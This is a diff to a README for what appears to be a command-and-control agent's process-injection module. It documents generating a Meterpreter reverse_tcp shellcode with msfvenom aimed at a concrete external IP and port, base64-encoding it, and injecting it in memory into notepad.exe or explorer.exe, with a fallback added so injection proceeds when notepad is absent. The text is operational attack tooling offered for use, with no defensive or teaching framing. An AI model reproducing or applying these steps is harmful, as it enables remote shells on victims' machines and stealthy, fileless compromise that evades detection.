@@ -453,29 +453,26 @@ result <agent_id> <task_id>
 ## Usage
 1. Generate compatible shellcode using msfvenom
 2. Use the module with a base64 encoded shellcode string
-3. The agent will inject the shellcode into notepad.exe in-memory
+3. The agent will in-memory inject the shellcode into either notepad.exe or explorer.exe 
 
 ## msfvenom Command Syntax
 Generate shellcode with proper null byte avoidance and correct format:
 
-   1    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw -o shellcode.bin
-   2    # Then base64 encode it before sending to the module
-   3     base64 -w 0 shellcode.bin
-
 ```
+# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=89.116.49.235 LPORT=1337 -f raw -o shellcode.bin
+# Then base64 encode it before sending to the module
+base64 -w 0 shellcode.bin
+
 pinject <shellcode> [agent_id=<agent_id>] # METHOD - 1
 run pinject <shellcode> [agent_id=<agent_id>] # METHOD - 2
 ```
 
 ## Notes
-- Ensure notepad.exe is running on the target system
+- If notepad.exe is not running on the target system, the agent will fallback on explorer.exe
 - The shellcode must be in raw binary format (use `-f raw`)
-- The module performs in-memory injection - no files are written to disk
-- Debug print statements are included in the agent for monitoring execution flow
-- The console hiding capability has been temporarily disabled for debugging
 
 ## Process Injection Flow
-1. Find target process (notepad.exe) PID
+1. Find target process PID
 2. Open process with appropriate permissions
 3. Allocate memory in target process
 4. Write shellcode to allocated memory
